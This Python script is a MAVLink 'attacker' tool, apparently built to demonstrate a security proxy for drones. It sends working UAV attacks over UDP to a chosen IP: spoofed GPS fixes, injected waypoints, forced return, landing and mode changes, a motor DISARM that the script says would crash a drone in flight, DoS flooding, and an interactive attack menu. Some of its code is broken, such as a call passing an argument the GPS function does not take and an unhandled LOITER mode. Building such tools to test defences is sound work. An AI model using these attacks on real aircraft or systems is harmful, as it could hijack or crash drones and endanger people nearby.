#!/usr/bin/env python3
"""
MAVLink Attacker - Simulated Malicious Actor

⚠️  FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY ⚠️

DEPLOYMENT: Run on Laptop 2 (separate from GCS/SITL)
TRUST LEVEL: ❌ Untrusted (hostile actor)

This script simulates various attack vectors against a UAV system:
1. GPS Spoofing - Fake GPS coordinates to mislead navigation
2. Waypoint Injection - Inject unauthorized mission waypoints
3. Command Injection - Send dangerous commands (RTL, DISARM, etc.)
4. DoS Flooding - Overwhelm system with rapid message bursts

Usage:
    Run this on a SEPARATE LAPTOP from the GCS/SITL system
    
    # Interactive mode (recommended for demo)
    python attacker.py --interactive
    
    WITHOUT AEGIS (attacks succeed):
        python attacker.py --target <SITL_IP> --port 14550
    
    WITH AEGIS (attacks blocked):
        python attacker.py --target <AEGIS_IP> --port 14560

Why UDP: MAVLink standard uses UDP for low-latency UAV control
Why pymavlink: Uses proper MAVLink protocol (not raw packet injection)
"""

import time
import sys
import argparse
import logging
import os
import yaml
from typing import Optional
from pathlib import Path
import socket

# Import pymavlink
try:
    from pymavlink import mavutil
    from pymavlink.dialects.v20 import common as mavlink2
except ImportError:
    print("ERROR: pymavlink not installed!")
    print("Install with: pip install pymavlink")
    sys.exit(1)

# Configure logging
os.makedirs('logs', exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/attacker.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('Attacker')


class MAVLinkAttacker:
    """
    Simulated malicious actor attempting to compromise UAV
    
    Attack Types Implemented:
    1. GPS Spoofing: Send fake GPS_RAW_INT messages
    2. Waypoint Injection: Inject unauthorized MISSION_ITEM commands
    3. Command Injection: Send dangerous COMMAND_LONG (RTL, DISARM, etc.)
    4. DoS Flooding: Rapid message burst to overwhelm system
    """
    
    def __init__(self, target_host: str, target_port: int):
        """
        Initialize attacker connection
        
        Args:
            target_host: Target IP (SITL or AEGIS proxy)
            target_port: Target port (14550 for SITL, 14560 for AEGIS)
        """
        self.target_host = target_host
        self.target_port = target_port
        
        # Create raw UDP socket (reliable on Windows)
        logger.info(f"🎯 Attacker creating UDP socket for: {target_host}:{target_port}")
        
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            logger.info(f"✅ UDP socket created")
        except Exception as e:
            logger.error(f"❌ Failed to create socket: {e}")
            sys.exit(1)
        
        # Create MAVLink packer (NO network binding - pure encoder)
        self.mav = mavlink2.MAVLink(None)
        self.mav.srcSystem = 255  # Attacker system ID
        self.mav.srcComponent = 190  # Attacker component ID
        
        # Attack statistics
        self.attacks_sent = {
            'gps_spoof': 0,
            'waypoint_inject': 0,
            'command_inject': 0,
            'dos_flood': 0,
            'total': 0
        }
    
    def send_heartbeat(self):
        """Send MAVLink HEARTBEAT to prime downstream parsers"""
        try:
            msg = self.mav.heartbeat_encode(
                mavutil.mavlink.MAV_TYPE_GCS,  # Type: Ground Control Station
                mavutil.mavlink.MAV_AUTOPILOT_INVALID,  # No autopilot
                0,  # Base mode
                0,  # Custom mode
                mavutil.mavlink.MAV_STATE_ACTIVE  # System status
            )
            packet = msg.pack(self.mav)
            self.sock.sendto(packet, (self.target_host, self.target_port))
            logger.info(f"[ATTACKER] Sent HEARTBEAT to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
            time.sleep(0.1)  # Brief delay for parser initialization
        except Exception as e:
            logger.warning(f"⚠️  Heartbeat send failed: {e}")
    
    def attack_gps_spoofing(self, fake_lat: float, fake_lon: float, fake_alt: float):
        """
        Attack 1: GPS Spoofing
        
        Send fake GPS coordinates to mislead the navigation system.
        Could redirect drone to unauthorized locations.
        
        Args:
            fake_lat: Spoofed latitude (degrees)
            fake_lon: Spoofed longitude (degrees)
            fake_alt: Spoofed altitude (meters)
        """
        logger.info("=" * 70)
        logger.info("🚨 ATTACK: GPS Spoofing")
        logger.info("=" * 70)
        logger.info(f"Fake GPS: Lat={fake_lat}, Lon={fake_lon}, Alt={fake_alt}m")
        
        try:
            # Create fake GPS_RAW_INT message
            msg = self.mav.gps_raw_int_encode(
                time_usec=int(time.time() * 1e6),  # Current time in microseconds
                fix_type=3,  # 3D fix (looks legitimate)
                lat=int(fake_lat * 1e7),  # Latitude in 1e7 degrees
                lon=int(fake_lon * 1e7),  # Longitude in 1e7 degrees
                alt=int(fake_alt * 1000),  # Altitude in mm
                eph=100,  # GPS HDOP
                epv=100,  # GPS VDOP
                vel=500,  # Ground speed (cm/s)
                cog=18000,  # Course over ground (degrees * 100)
                satellites_visible=12  # Number of satellites (looks legitimate)
            )
            packet = msg.pack(self.mav)
            self.sock.sendto(packet, (self.target_host, self.target_port))
            
            self.attacks_sent['gps_spoof'] += 1
            self.attacks_sent['total'] += 1
            logger.info(f"[ATTACKER] Sent GPS_RAW_INT to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
            logger.info(f"✅ Fake GPS message sent (Total: {self.attacks_sent['gps_spoof']})")
            
        except Exception as e:
            logger.error(f"❌ GPS spoofing failed: {e}")
    
    def attack_waypoint_injection(self, seq: int, lat: float, lon: float, alt: float):
        """
        Attack 2: Waypoint Injection
        
        Inject unauthorized waypoints into the mission plan.
        Could redirect drone mid-flight to dangerous locations.
        
        Args:
            seq: Waypoint sequence number
            lat: Waypoint latitude (degrees)
            lon: Waypoint longitude (degrees)
            alt: Waypoint altitude (meters)
        """
        logger.info("=" * 70)
        logger.info("🚨 ATTACK: Waypoint Injection")
        logger.info("=" * 70)
        logger.info(f"Injecting waypoint #{seq}: Lat={lat}, Lon={lon}, Alt={alt}m")
        
        try:
            # Create malicious MISSION_ITEM message
            msg = self.mav.mission_item_encode(
                target_system=1,  # Target autopilot system ID
                target_component=1,  # Target autopilot component ID
                seq=seq,  # Waypoint sequence number
                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                current=0,  # Not the current waypoint
                autocontinue=1,  # Auto-continue to next waypoint
                param1=0,  # Hold time
                param2=5,  # Acceptance radius
                param3=0,  # Pass through waypoint
                param4=0,  # Yaw angle
                x=lat,  # Latitude
                y=lon,  # Longitude
                z=alt  # Altitude
            )
            packet = msg.pack(self.mav)
            self.sock.sendto(packet, (self.target_host, self.target_port))
            
            self.attacks_sent['waypoint_inject'] += 1
            self.attacks_sent['total'] += 1
            logger.info(f"[ATTACKER] Sent MISSION_ITEM to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
            logger.info(f"✅ Malicious waypoint sent (Total: {self.attacks_sent['waypoint_inject']})")
            
        except Exception as e:
            logger.error(f"❌ Waypoint injection failed: {e}")
    
    def attack_command_injection(self, command_type: str = "RTL"):
        """
        Attack 3: Command Injection
        
        Send dangerous commands that could compromise flight safety:
        - RTL (Return to Launch) - Force drone to return
        - DISARM - Disable motors mid-flight (CRASH!)
        - MODE_CHANGE - Change flight mode unexpectedly
        
        Args:
            command_type: Type of command to inject (RTL, DISARM, LAND)
        """
        logger.info("=" * 70)
        logger.info(f"🚨 ATTACK: Command Injection ({command_type})")
        logger.info("=" * 70)
        
        try:
            if command_type == "RTL":
                # Force Return to Launch
                logger.info("Forcing RTL (Return to Launch)...")
                msg = self.mav.command_long_encode(
                    target_system=1,
                    target_component=1,
                    command=mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                    confirmation=0,
                    param1=0, param2=0, param3=0, param4=0,
                    param5=0, param6=0, param7=0
                )
                packet = msg.pack(self.mav)
                self.sock.sendto(packet, (self.target_host, self.target_port))
                logger.info(f"[ATTACKER] Sent COMMAND_LONG (RTL) to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
                
            elif command_type == "DISARM":
                # DANGEROUS: Disarm motors (would cause crash if in flight!)
                logger.warning("⚠️  ATTEMPTING TO DISARM MOTORS (WOULD CAUSE CRASH!)")
                msg = self.mav.command_long_encode(
                    target_system=1,
                    target_component=1,
                    command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                    confirmation=0,
                    param1=0,  # 0 = disarm
                    param2=0, param3=0, param4=0,
                    param5=0, param6=0, param7=0
                )
                packet = msg.pack(self.mav)
                self.sock.sendto(packet, (self.target_host, self.target_port))
                logger.info(f"[ATTACKER] Sent COMMAND_LONG (DISARM) to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
                
            elif command_type == "LAND":
                # Force landing
                logger.info("Forcing emergency landing...")
                msg = self.mav.command_long_encode(
                    target_system=1,
                    target_component=1,
                    command=mavutil.mavlink.MAV_CMD_NAV_LAND,
                    confirmation=0,
                    param1=0, param2=0, param3=0, param4=0,
                    param5=0, param6=0, param7=0
                )
                packet = msg.pack(self.mav)
                self.sock.sendto(packet, (self.target_host, self.target_port))
                logger.info(f"[ATTACKER] Sent COMMAND_LONG (LAND) to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
            
            elif command_type == "MODE_GUIDED":
                # Change to GUIDED mode (take over control)
                logger.info("Switching to GUIDED mode (hijacking control)...")
                msg = self.mav.set_mode_encode(
                    target_system=1,
                    base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                    custom_mode=4  # GUIDED mode for ArduCopter
                )
                packet = msg.pack(self.mav)
                self.sock.sendto(packet, (self.target_host, self.target_port))
                logger.info(f"[ATTACKER] Sent SET_MODE to {self.target_host}:{self.target_port} ({len(packet)} bytes)")
            
            self.attacks_sent['command_inject'] += 1
            self.attacks_sent['total'] += 1
            logger.info(f"✅ Dangerous command sent (Total: {self.attacks_sent['command_inject']})")
            
        except Exception as e:
            logger.error(f"❌ Command injection failed: {e}")
    
    def attack_dos_flooding(self, duration_sec: int = 5, rate_hz: int = 100):
        """
        Attack 4: Denial of Service (DoS) Flooding
        
        Flood the system with rapid message bursts to:
        - Overwhelm processing capacity
        - Cause packet loss
        - Delay legitimate commands
        - Potentially crash the autopilot
        
        Args:
            duration_sec: How long to flood (seconds)
            rate_hz: Messages per second
        """
        logger.info("=" * 70)
        logger.info(f"🚨 ATTACK: DoS Flooding")
        logger.info("=" * 70)
        logger.info(f"Flooding for {duration_sec}s at {rate_hz} msgs/sec")
        logger.warning("⚠️  This may cause system instability!")
        
        start_time = time.time()
        msg_count = 0
        
        try:
            while (time.time() - start_time) < duration_sec:
                # Send rapid heartbeat messages
                msg = self.mav.heartbeat_encode(
                    type=mavutil.mavlink.MAV_TYPE_GCS,
                    autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                    base_mode=0,
                    custom_mode=0,
                    system_status=mavutil.mavlink.MAV_STATE_ACTIVE
                )
                packet = msg.pack(self.mav)
                self.sock.sendto(packet, (self.target_host, self.target_port))
                
                msg_count += 1
                
                # Rate limiting
                time.sleep(1.0 / rate_hz)
                
                # Progress update every 50 messages
                if msg_count % 50 == 0:
                    elapsed = time.time() - start_time
                    actual_rate = msg_count / elapsed
                    logger.info(f"  Flooding... {msg_count} msgs sent ({actual_rate:.1f} msgs/sec)")
                    logger.info(f"[ATTACKER] Sent HEARTBEAT #{msg_count} to {self.target_host}:{self.target_port}")
            
            self.attacks_sent['dos_flood'] += msg_count
            self.attacks_sent['total'] += msg_count
            
            elapsed = time.time() - start_time
            actual_rate = msg_count / elapsed
            logger.info(f"✅ DoS flood complete: {msg_count} msgs in {elapsed:.1f}s ({actual_rate:.1f} msgs/sec)")
            
        except KeyboardInterrupt:
            logger.info("DoS flooding interrupted by user")
        except Exception as e:
            logger.error(f"❌ DoS flooding failed: {e}")
    
    def combined_attack_scenario(self):
        """
        Combined Attack Scenario: Multiple attack vectors in sequence
        
        Simulates sophisticated attacker using multiple techniques
        """
        logger.info("=" * 70)
        logger.info("🚨 COMBINED ATTACK SCENARIO")
        logger.info("=" * 70)
        logger.info("Launching multi-vector attack...")
        
        # Send heartbeat first to prime parser
        self.send_heartbeat()
        
        # Attack 1: GPS spoofing (mislead navigation)
        logger.info("\n[1/4] Phase 1: GPS Spoofing")
        self.attack_gps_spoofing(
            fake_lat=37.7749,  # San Francisco (far from actual location)
            fake_lon=-122.4194,
            fake_alt=1000  # High altitude
        )
        time.sleep(2)
        
        # Attack 2: Waypoint injection
        logger.info("\n[2/4] Phase 2: Waypoint Injection")
        self.attack_waypoint_injection(
            seq=99,  # High sequence number
            lat=40.7128,  # New York
            lon=-74.0060,
            alt=500
        )
        time.sleep(2)
        
        # Attack 3: Command injection (RTL)
        logger.info("\n[3/4] Phase 3: Command Injection (RTL)")
        self.attack_command_injection("RTL")
        time.sleep(2)
        
        # Attack 4: DoS flooding
        logger.info("\n[4/4] Phase 4: DoS Flooding")
        self.attack_dos_flooding(duration_sec=3, rate_hz=50)
        
        logger.info("\n✅ Combined attack scenario complete")
    
    def print_statistics(self):
        """Print attack statistics"""
        logger.info("=" * 70)
        logger.info("📊 Attack Statistics")
        logger.info("=" * 70)
        logger.info(f"GPS Spoofing:      {self.attacks_sent['gps_spoof']}")
        logger.info(f"Waypoint Injection: {self.attacks_sent['waypoint_inject']}")
        logger.info(f"Command Injection:  {self.attacks_sent['command_inject']}")
        logger.info(f"DoS Flooding:       {self.attacks_sent['dos_flood']}")
        logger.info(f"Total Attacks:      {self.attacks_sent['total']}")
        logger.info("=" * 70)
    
    def interactive_mode(self):
        """Interactive attacker console"""
        print("\n" + "="*70)
        print("   ATTACKER CONSOLE")
        print("   MAVLink Injection Interface")
        print("="*70)
        print(f"Target: AEGIS Gateway {self.target_host}:{self.target_port}")
        print("="*70)
        print("\n⚠️  FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY ⚠️\n")
        
        # Send initial heartbeat to prime MAVLink parser
        self.send_heartbeat()
        
        while True:
            print("\nSelect an attack to launch:")
            print()
            print("[1] Inject Fake Waypoint")
            print("[2] Force Return-to-Launch (RTL)")
            print("[3] GPS Spoofing Attack")
            print("[4] Command Flood (DoS-style)")
            print("[5] Mode Flapping Attack")
            print("[0] Exit Attacker Console")
            print()
            
            try:
                choice = input("Enter choice: ").strip()
                
                if choice == '0':
                    print("\n🛑 Exiting attacker console...")
                    break
                
                elif choice == '1':
                    # Waypoint injection
                    print("\n🚨 Launching waypoint injection attack...")
                    try:
                        lat = input("Enter latitude (default 37.7749): ").strip()
                        lon = input("Enter longitude (default -122.4194): ").strip()
                        alt = input("Enter altitude (default 1000): ").strip()
                        
                        latitude = float(lat) if lat else 37.7749
                        longitude = float(lon) if lon else -122.4194
                        altitude = float(alt) if alt else 1000
                        
                        self.attack_waypoint_injection(99, latitude, longitude, altitude)
                    except ValueError:
                        logger.error("Invalid coordinate values")
                
                elif choice == '2':
                    # RTL injection
                    print("\n🚨 Forcing Return-to-Launch...")
                    self.attack_command_injection('RTL')
                
                elif choice == '3':
                    # GPS spoofing
                    print("\n🚨 Launching GPS spoofing attack...")
                    try:
                        duration = input("Enter duration in seconds (default 5): ").strip()
                        dur = int(duration) if duration else 5
                        self.attack_gps_spoofing(37.7749, -122.4194, 1000, duration=dur)
                    except ValueError:
                        logger.error("Invalid duration value")
                
                elif choice == '4':
                    # DoS flooding
                    print("\n🚨 Launching DoS flooding attack...")
                    try:
                        duration = input("Enter duration in seconds (default 5): ").strip()
                        rate = input("Enter message rate (default 100): ").strip()
                        
                        dur = int(duration) if duration else 5
                        msg_rate = int(rate) if rate else 100
                        
                        self.attack_dos_flooding(dur, msg_rate)
                    except ValueError:
                        logger.error("Invalid parameter values")
                
                elif choice == '5':
                    # Mode flapping
                    print("\n🚨 Launching mode flapping attack...")
                    logger.info("Rapidly switching between GUIDED and LOITER modes...")
                    for i in range(10):
                        mode = "GUIDED" if i % 2 == 0 else "LOITER"
                        self.attack_command_injection(f'MODE_{mode}')
                        time.sleep(0.5)
                    logger.info("Mode flapping complete")
                
                else:
                    print("❌ Invalid choice. Please try again.")
                
                time.sleep(1)
                
            except KeyboardInterrupt:
                print("\n\n🛑 Attacker interrupted by user")
                break
            except Exception as e:
                logger.error(f"Attack error: {e}")
        
        self.print_statistics()


def load_config(config_path: str = "config.yaml") -> dict:
    """Load configuration from YAML file"""
    config_file = Path(__file__).parent / config_path
    
    if not config_file.exists():
        logger.warning(f"Config file not found: {config_file}")
        logger.info("Using command line arguments")
        return {}
    
    try:
        with open(config_file, 'r') as f:
            config = yaml.safe_load(f)
            logger.info(f"✅ Configuration loaded from {config_file}")
            return config
    except Exception as e:
        logger.error(f"Failed to load config: {e}")
        return {}


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='MAVLink Attacker - Educational Attack Simulation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY ⚠️

Examples:
  # Interactive mode (recommended for demo)
  python attacker.py --interactive
  
  # Attack SITL directly (no protection)
  python attacker.py --target 192.168.1.100 --port 14550 --attack gps-spoof
  
  # Attack through AEGIS proxy (will be blocked)
  python attacker.py --target 192.168.1.100 --port 14560 --attack gps-spoof
  
  # Combined attack scenario
  python attacker.py --target 192.168.1.100 --port 14560 --attack combined
  
  # DoS flooding attack
  python attacker.py --target 192.168.1.100 --port 14560 --attack dos --duration 10

Attack Types:
  gps-spoof        - Send fake GPS coordinates
  waypoint-inject  - Inject unauthorized waypoints
  rtl              - Force return to launch
  disarm           - Attempt to disarm motors (dangerous!)
  land             - Force emergency landing
  mode-change      - Change flight mode
  dos              - Denial of service flooding
  combined         - All attacks in sequence
        """
    )
    
    parser.add_argument('--config', default='config.yaml',
                       help='Path to config file (default: config.yaml)')
    parser.add_argument('--target',
                       help='Target IP address (SITL or AEGIS proxy)')
    parser.add_argument('--port', type=int,
                       help='Target port (14550=SITL, 14560=AEGIS)')
    parser.add_argument('--interactive', action='store_true',
                       help='Interactive attack menu')
    parser.add_argument('--attack', default='combined',
                       choices=['gps-spoof', 'waypoint-inject', 'rtl', 'disarm', 
                               'land', 'mode-change', 'dos', 'combined'],
                       help='Attack type to execute')
    parser.add_argument('--duration', type=int, default=5,
                       help='Duration for DoS attack (seconds)')
    parser.add_argument('--rate', type=int, default=100,
                       help='Message rate for DoS attack (msgs/sec)')
    parser.add_argument('--lat', type=float, default=37.7749,
                       help='Latitude for GPS spoofing')
    parser.add_argument('--lon', type=float, default=-122.4194,
                       help='Longitude for GPS spoofing')
    parser.add_argument('--alt', type=float, default=1000,
                       help='Altitude for GPS spoofing (meters)')
    
    args = parser.parse_args()
    
    # Load configuration
    config = load_config(args.config)
    conn_config = config.get('connection', {})
    
    # Get target from CLI or config
    target_host = args.target or conn_config.get('target_host', '127.0.0.1')
    target_port = args.port or conn_config.get('target_port', 14560)
    
    # Create attacker instance
    attacker = MAVLinkAttacker(target_host, target_port)
    
    logger.info("=" * 70)
    logger.info("⚠️  MAVLink Attack Simulation")
    logger.info("=" * 70)
    logger.info(f"Target: {target_host}:{target_port}")
    
    if target_port == 14550:
        logger.warning("⚠️  Attacking SITL DIRECTLY (no AEGIS protection)")
        logger.warning("⚠️  Attacks will likely SUCCEED!")
    elif target_port == 14560:
        logger.info("✅ Attacking through AEGIS proxy")
        logger.info("✅ Attacks should be BLOCKED")
    
    logger.info("=" * 70)
    
    # Handle interactive mode
    if args.interactive:
        time.sleep(2)
        attacker.interactive_mode()
        sys.exit(0)
    
    logger.info(f"Attack mode: {args.attack}")
    
    try:
        # Wait a moment for connection
        time.sleep(2)
        
        # Execute attack based on type
        if args.attack == 'gps-spoof':
            attacker.attack_gps_spoofing(args.lat, args.lon, args.alt)
        
        elif args.attack == 'waypoint-inject':
            attacker.attack_waypoint_injection(99, args.lat, args.lon, args.alt)
        
        elif args.attack == 'rtl':
            attacker.attack_command_injection('RTL')
        
        elif args.attack == 'disarm':
            logger.warning("⚠️  WARNING: DISARM attack is EXTREMELY DANGEROUS!")
            logger.warning("⚠️  Would cause CRASH if drone is in flight!")
            confirm = input("Type 'YES' to proceed: ")
            if confirm == 'YES':
                attacker.attack_command_injection('DISARM')
            else:
                logger.info("Attack cancelled by user")
        
        elif args.attack == 'land':
            attacker.attack_command_injection('LAND')
        
        elif args.attack == 'mode-change':
            attacker.attack_command_injection('MODE_GUIDED')
        
        elif args.attack == 'dos':
            attacker.attack_dos_flooding(args.duration, args.rate)
        
        elif args.attack == 'combined':
            attacker.combined_attack_scenario()
        
        # Print statistics
        time.sleep(1)
        attacker.print_statistics()
        
    except KeyboardInterrupt:
        logger.info("\n🛑 Attack interrupted by user")
        attacker.print_statistics()
    except Exception as e:
        logger.error(f"❌ Attack failed: {e}")


if __name__ == '__main__':
    main()
